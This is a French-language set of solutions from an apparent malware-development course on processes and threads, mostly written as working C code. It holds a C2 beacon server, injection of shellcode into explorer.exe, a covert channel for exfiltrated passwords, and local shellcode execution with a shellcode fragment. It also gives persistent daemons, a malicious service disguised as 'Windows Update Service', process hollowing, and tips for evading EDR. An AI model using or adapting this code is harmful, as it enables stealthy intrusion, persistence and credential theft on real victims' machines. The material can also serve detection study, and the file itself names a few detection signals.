⚠️ AVERTISSEMENT STRICT
Techniques de malware development avancées. Usage éducatif uniquement.
Tests sur VM isolées. Usage malveillant = PRISON.

SOLUTIONS - MODULE 21 : PROCESS & THREADS

===============================================================================
SOLUTION 1 : C2 BEACON MULTI-CLIENT
===============================================================================

Architecture thread pool avec socket multiplexing pour gérer plusieurs beacons:

// Structure pour beacon client
typedef struct {
    int sock_fd;
    pthread_t thread;
    char beacon_id[64];
    time_t last_heartbeat;
} BeaconClient;

// Thread handler pour chaque beacon
void* beacon_handler(void* arg) {
    BeaconClient* client = (BeaconClient*)arg;
    char buffer[4096];

    while(1) {
        // Recevoir heartbeat
        int n = recv(client->sock_fd, buffer, sizeof(buffer), 0);
        if (n <= 0) {
            printf("[!] Beacon %s disconnected\n", client->beacon_id);
            break;
        }

        client->last_heartbeat = time(NULL);

        // Parser commande beacon (format: TYPE|DATA)
        if (strncmp(buffer, "HEARTBEAT", 9) == 0) {
            send(client->sock_fd, "ACK", 3, 0);
        } else if (strncmp(buffer, "TASKING", 7) == 0) {
            // Envoyer tâches en attente
            send_pending_tasks(client);
        }
    }

    close(client->sock_fd);
    return NULL;
}

// Main server loop avec select() multiplexing
int main() {
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    // ... bind, listen ...

    fd_set readfds;
    BeaconClient clients[MAX_CLIENTS];

    while(1) {
        FD_ZERO(&readfds);
        FD_SET(server_fd, &readfds);

        select(server_fd + 1, &readfds, NULL, NULL, NULL);

        if (FD_ISSET(server_fd, &readfds)) {
            // Nouveau beacon connecté
            int client_sock = accept(server_fd, NULL, NULL);

            // Créer thread dédié
            pthread_create(&clients[i].thread, NULL,
                         beacon_handler, &clients[i]);
            pthread_detach(clients[i].thread);  // Auto-cleanup
        }
    }
}

APIs clés :
- Linux : socket(), select(), pthread_create(), recv()/send()
- Windows : WSASocket(), select(), CreateThread(), recv()/send()

Références :
- MSDN Winsock2 Functions
- man 2 select, man 3 pthread_create

===============================================================================
SOLUTION 2 : PROCESS MIGRATION
===============================================================================

Migration d'un payload vers un processus cible légitime (Windows) :

#include <windows.h>
#include <tlhelp32.h>

// Trouver PID d'un processus par nom
DWORD find_process_by_name(const char* proc_name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, proc_name) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

// Migration du payload
BOOL migrate_to_process(DWORD target_pid, LPVOID payload, SIZE_T size) {
    // Ouvrir processus cible
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!hProcess) return FALSE;

    // Allouer mémoire RWX dans processus distant
    LPVOID remote_mem = VirtualAllocEx(hProcess, NULL, size,
                                      MEM_COMMIT | MEM_RESERVE,
                                      PAGE_EXECUTE_READWRITE);
    if (!remote_mem) {
        CloseHandle(hProcess);
        return FALSE;
    }

    // Écrire payload
    if (!WriteProcessMemory(hProcess, remote_mem, payload, size, NULL)) {
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Créer thread distant pour exécuter
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)remote_mem,
                                       NULL, 0, NULL);

    if (hThread) {
        printf("[+] Migrated to PID %lu\n", target_pid);
        CloseHandle(hThread);

        // Terminer processus actuel proprement
        ExitProcess(0);
    }

    CloseHandle(hProcess);
    return hThread != NULL;
}

// Usage
int main() {
    unsigned char payload[] = { /* shellcode */ };

    DWORD explorer_pid = find_process_by_name("explorer.exe");
    if (explorer_pid) {
        migrate_to_process(explorer_pid, payload, sizeof(payload));
    }
}

APIs clés :
- CreateToolhelp32Snapshot : Énumérer processus
- OpenProcess : Obtenir handle vers processus distant
- VirtualAllocEx : Allouer mémoire dans processus distant
- WriteProcessMemory : Écrire dans processus distant
- CreateRemoteThread : Créer thread dans processus distant

Alternative EDR-friendly : QueueUserAPC au lieu de CreateRemoteThread

Références :
- MSDN CreateRemoteThread
- Meterpreter source code (migrate.c)

===============================================================================
SOLUTION 3 : FORK BOMB PROTECTION
===============================================================================

Gestion intelligente de processus enfants avec limitation :

#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>

#define MAX_WORKERS 5

volatile int active_workers = 0;
pid_t worker_pids[MAX_WORKERS];

// Cleanup processus zombies
void sigchld_handler(int sig) {
    int status;
    pid_t pid;

    while ((pid = waitpid(-1, &status, WNOHANG)) > 0) {
        // Retirer du pool
        for (int i = 0; i < MAX_WORKERS; i++) {
            if (worker_pids[i] == pid) {
                worker_pids[i] = 0;
                active_workers--;
                printf("[Pool] Worker %d terminated\n", pid);
                break;
            }
        }
    }
}

// Créer worker si slot disponible
BOOL spawn_worker() {
    if (active_workers >= MAX_WORKERS) {
        printf("[Pool] Max workers reached (%d)\n", MAX_WORKERS);
        return FALSE;
    }

    pid_t pid = fork();

    if (pid < 0) {
        perror("fork");
        return FALSE;
    }

    if (pid == 0) {
        // Worker process
        printf("[Worker %d] Started\n", getpid());

        // Faire le travail malveillant
        do_malicious_work();

        exit(0);
    }

    // Parent - enregistrer worker
    for (int i = 0; i < MAX_WORKERS; i++) {
        if (worker_pids[i] == 0) {
            worker_pids[i] = pid;
            active_workers++;
            break;
        }
    }

    return TRUE;
}

int main() {
    // Installer handler pour cleanup auto
    signal(SIGCHLD, sigchld_handler);

    // Initialiser pool
    memset(worker_pids, 0, sizeof(worker_pids));

    // Spawner workers selon besoin
    for (int i = 0; i < 10; i++) {
        if (!spawn_worker()) {
            sleep(1);  // Attendre qu'un slot se libère
            i--;
        }
    }

    // Attendre tous les workers
    while (active_workers > 0) {
        pause();  // Attendre SIGCHLD
    }
}

APIs clés :
- fork() : Créer processus enfant
- waitpid(WNOHANG) : Cleanup non-bloquant des zombies
- signal(SIGCHLD) : Handler automatique pour cleanup

Références :
- man 2 fork, man 2 waitpid, man 7 signal

===============================================================================
SOLUTION 4 : IPC COVERT CHANNEL
===============================================================================

Communication inter-processus via shared memory (POSIX) :

#include <sys/mman.h>
#include <fcntl.h>
#include <semaphore.h>

#define SHM_NAME "/covert_channel"
#define SEM_NAME "/covert_sem"

typedef struct {
    int cmd_type;       // 0=exfil, 1=execute, 2=sleep
    size_t data_len;
    char data[4096];
} CovertMessage;

// Processus expéditeur (malware principal)
void sender_process() {
    int shm_fd = shm_open(SHM_NAME, O_CREAT | O_RDWR, 0600);
    ftruncate(shm_fd, sizeof(CovertMessage));

    CovertMessage* msg = mmap(NULL, sizeof(CovertMessage),
                             PROT_READ | PROT_WRITE,
                             MAP_SHARED, shm_fd, 0);

    sem_t* sem = sem_open(SEM_NAME, O_CREAT, 0600, 0);

    // Envoyer données sensibles
    msg->cmd_type = 0;  // Exfiltration
    strcpy(msg->data, "Passwords: admin:P@ssw0rd123");
    msg->data_len = strlen(msg->data);

    // XOR encoding basique
    for (size_t i = 0; i < msg->data_len; i++) {
        msg->data[i] ^= 0xAA;
    }

    sem_post(sem);  // Signaler disponibilité

    munmap(msg, sizeof(CovertMessage));
    close(shm_fd);
}

// Processus récepteur (module d'exfiltration)
void receiver_process() {
    int shm_fd = shm_open(SHM_NAME, O_RDONLY, 0600);

    CovertMessage* msg = mmap(NULL, sizeof(CovertMessage),
                             PROT_READ, MAP_SHARED, shm_fd, 0);

    sem_t* sem = sem_open(SEM_NAME, 0);

    while(1) {
        sem_wait(sem);  // Attendre message

        // Décoder XOR
        for (size_t i = 0; i < msg->data_len; i++) {
            msg->data[i] ^= 0xAA;
        }

        printf("[Exfil] Type=%d, Data=%s\n", msg->cmd_type, msg->data);

        // Envoyer au C2
        send_to_c2(msg->data, msg->data_len);
    }

    munmap(msg, sizeof(CovertMessage));
    shm_unlink(SHM_NAME);
}

APIs clés :
- shm_open() : Créer objet shared memory
- mmap() : Mapper en mémoire processus
- sem_open/sem_wait/sem_post : Synchronisation

Avantages :
- Pas de syscalls réseau (furtif)
- Pas de fichiers sur disque
- Communication rapide

Références :
- man shm_overview, man sem_overview

===============================================================================
SOLUTION 5 : THREAD INJECTION LOCALE
===============================================================================

Self-injection de shellcode dans thread local :

#include <windows.h>

int main() {
    // Shellcode calc.exe (x64)
    unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52";

    SIZE_T size = sizeof(shellcode);

    // Allouer mémoire RWX
    LPVOID exec_mem = VirtualAlloc(NULL, size,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);

    if (!exec_mem) {
        printf("[!] VirtualAlloc failed\n");
        return 1;
    }

    // Copier shellcode
    memcpy(exec_mem, shellcode, size);

    // Méthode 1 : VirtualProtect pour passer RWX -> RX (plus furtif)
    DWORD old_protect;
    VirtualProtect(exec_mem, size, PAGE_EXECUTE_READ, &old_protect);

    // Créer thread pointant vers shellcode
    HANDLE hThread = CreateThread(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)exec_mem,
                                  NULL, 0, NULL);

    if (hThread) {
        printf("[+] Shellcode thread created\n");
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}

Variante Linux :

#include <sys/mman.h>

void execute_shellcode_linux(unsigned char* shellcode, size_t size) {
    // Allouer page RWX
    void* exec_mem = mmap(NULL, size,
                         PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        return;
    }

    memcpy(exec_mem, shellcode, size);

    // Créer thread
    pthread_t thread;
    pthread_create(&thread, NULL, (void*(*)(void*))exec_mem, NULL);
    pthread_join(thread, NULL);

    munmap(exec_mem, size);
}

APIs clés :
- VirtualAlloc : Allouer mémoire avec permissions spécifiques
- VirtualProtect : Changer permissions (RWX -> RX)
- CreateThread : Créer thread local
- mmap : Linux equivalent avec PROT_EXEC

Note sécurité :
- Les EDRs surveillent VirtualAlloc avec PAGE_EXECUTE_READWRITE
- Préférer RW -> copie -> RX (deux étapes)

Références :
- MSDN VirtualAlloc, VirtualProtect
- Shellcode database : shell-storm.org

===============================================================================
SOLUTION 6 : DAEMON/SERVICE BACKGROUNDING
===============================================================================

Créer un daemon Linux persistant (double fork technique) :

#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

void daemonize() {
    pid_t pid;

    // Premier fork
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);  // Parent termine

    // Créer nouvelle session (détacher terminal)
    if (setsid() < 0) exit(EXIT_FAILURE);

    // Ignorer SIGHUP
    signal(SIGHUP, SIG_IGN);

    // Second fork (empêcher réacquisition terminal)
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    // Changer répertoire de travail
    chdir("/");

    // Fermer file descriptors
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // Rediriger vers /dev/null
    open("/dev/null", O_RDONLY);  // stdin
    open("/dev/null", O_RDWR);    // stdout
    open("/dev/null", O_RDWR);    // stderr

    // Écrire PID file
    FILE* pidfile = fopen("/var/run/myservice.pid", "w");
    if (pidfile) {
        fprintf(pidfile, "%d\n", getpid());
        fclose(pidfile);
    }
}

int main() {
    daemonize();

    // Code du malware daemon
    while(1) {
        // Beacon vers C2, keylogging, etc.
        sleep(60);
    }

    return 0;
}

Variante Windows (service) :

#include <windows.h>

SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    g_StatusHandle = RegisterServiceCtrlHandler("MyMalwareService",
                                                ServiceCtrlHandler);

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    // Logique malveillante
    while(1) {
        // Beacon, keylog, etc.
        Sleep(60000);
    }
}

// Installation du service
void install_service() {
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);

    CreateService(schSCManager,
                 "MyMalwareService",
                 "Windows Update Service",  // Nom légitime
                 SERVICE_ALL_ACCESS,
                 SERVICE_WIN32_OWN_PROCESS,
                 SERVICE_AUTO_START,  // Démarrage auto
                 SERVICE_ERROR_NORMAL,
                 "C:\\path\\to\\malware.exe",
                 NULL, NULL, NULL, NULL, NULL);
}

APIs clés :
- Linux : fork(), setsid(), daemon()
- Windows : CreateService, RegisterServiceCtrlHandler

Références :
- man daemon, man setsid
- MSDN Service Functions

===============================================================================
SOLUTION 7 : THREAD POOL AVEC WORK QUEUE
===============================================================================

Producer-consumer pattern avec condition variables :

#include <pthread.h>

typedef struct Task {
    void (*function)(void*);
    void* arg;
    struct Task* next;
} Task;

typedef struct {
    Task* head;
    Task* tail;
    pthread_mutex_t mutex;
    pthread_cond_t cond;
    int shutdown;
} TaskQueue;

TaskQueue g_queue;
pthread_t g_workers[NUM_THREADS];

void* worker_thread(void* arg) {
    while(1) {
        pthread_mutex_lock(&g_queue.mutex);

        // Attendre tâche ou shutdown
        while (g_queue.head == NULL && !g_queue.shutdown) {
            pthread_cond_wait(&g_queue.cond, &g_queue.mutex);
        }

        if (g_queue.shutdown && g_queue.head == NULL) {
            pthread_mutex_unlock(&g_queue.mutex);
            break;  // Poison pill
        }

        // Récupérer tâche
        Task* task = g_queue.head;
        g_queue.head = task->next;
        if (g_queue.head == NULL) g_queue.tail = NULL;

        pthread_mutex_unlock(&g_queue.mutex);

        // Exécuter
        task->function(task->arg);
        free(task);
    }

    return NULL;
}

void add_task(void (*func)(void*), void* arg) {
    Task* task = malloc(sizeof(Task));
    task->function = func;
    task->arg = arg;
    task->next = NULL;

    pthread_mutex_lock(&g_queue.mutex);

    if (g_queue.tail) {
        g_queue.tail->next = task;
    } else {
        g_queue.head = task;
    }
    g_queue.tail = task;

    pthread_cond_signal(&g_queue.cond);  // Réveiller worker
    pthread_mutex_unlock(&g_queue.mutex);
}

void shutdown_pool() {
    pthread_mutex_lock(&g_queue.mutex);
    g_queue.shutdown = 1;
    pthread_cond_broadcast(&g_queue.cond);  // Réveiller tous
    pthread_mutex_unlock(&g_queue.mutex);

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(g_workers[i], NULL);
    }
}

APIs clés :
- pthread_cond_wait : Attendre signal
- pthread_cond_signal : Réveiller un thread
- pthread_cond_broadcast : Réveiller tous

Références :
- man pthread_cond_wait

===============================================================================
SOLUTION 8 : PROCESS HOLLOWING (RunPE)
===============================================================================

Technique avancée d'injection (Windows uniquement) :

#include <windows.h>
#include <winternl.h>

// Nécessite NtUnmapViewOfSection depuis ntdll
typedef NTSTATUS (NTAPI *pfnNtUnmapViewOfSection)(HANDLE, PVOID);

BOOL hollow_process(const char* target_exe, LPVOID payload, SIZE_T size) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // Créer processus suspendu
    if (!CreateProcessA(target_exe, NULL, NULL, NULL, FALSE,
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return FALSE;
    }

    printf("[+] Created suspended process PID %lu\n", pi.dwProcessId);

    // Obtenir image base du processus
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    PVOID peb_addr = (PVOID)ctx.Rdx;  // x64: RDX pointe vers PEB
    PVOID image_base;
    ReadProcessMemory(pi.hProcess, (PBYTE)peb_addr + 16,  // PEB.ImageBaseAddress offset
                     &image_base, sizeof(PVOID), NULL);

    // Unmap le PE original
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pfnNtUnmapViewOfSection NtUnmap =
        (pfnNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");

    NtUnmap(pi.hProcess, image_base);
    printf("[+] Unmapped original image at %p\n", image_base);

    // Allouer nouvelle mémoire à la même adresse
    LPVOID new_base = VirtualAllocEx(pi.hProcess, image_base, size,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);

    // Écrire notre payload (PE ou shellcode)
    WriteProcessMemory(pi.hProcess, new_base, payload, size, NULL);

    // Fixer contexte pour pointer vers notre entry point
    ctx.Rcx = (DWORD64)((PBYTE)new_base + 0x1000);  // Entry point offset
    SetThreadContext(pi.hThread, &ctx);

    // Reprendre exécution
    ResumeThread(pi.hThread);
    printf("[+] Process hollowed successfully\n");

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return TRUE;
}

APIs clés :
- CreateProcess(CREATE_SUSPENDED) : Créer suspendu
- NtUnmapViewOfSection : Vider mémoire (undocumented)
- GetThreadContext/SetThreadContext : Manipuler registres
- ResumeThread : Reprendre exécution

Détection :
- Memory scanning pour PE headers anormaux
- Sysmon Event ID 25 (Process Tampering)

Références :
- MSDN Process and Thread Functions
- hasherezade/process_hollowing (GitHub)
- Undocumented NT API reference
